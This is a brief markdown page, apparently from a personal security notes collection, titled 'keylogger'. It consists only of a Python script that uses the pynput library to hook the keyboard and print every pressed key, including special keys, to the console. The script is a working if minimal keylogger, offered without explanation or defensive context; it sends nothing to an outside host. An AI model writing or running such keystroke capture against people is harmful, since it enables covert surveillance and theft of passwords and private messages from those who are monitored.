---
icon: python
---

# keylogger

```
from pynput import keyboard

def on_press(key):
    try:
        print(f'[+] Key: {key.char}')
    except AttributeError:
        print(f'[+] Special Key: {key}')
listener = keyboard.Listener(on_press=on_press)
listener.start()
listener.join()
```
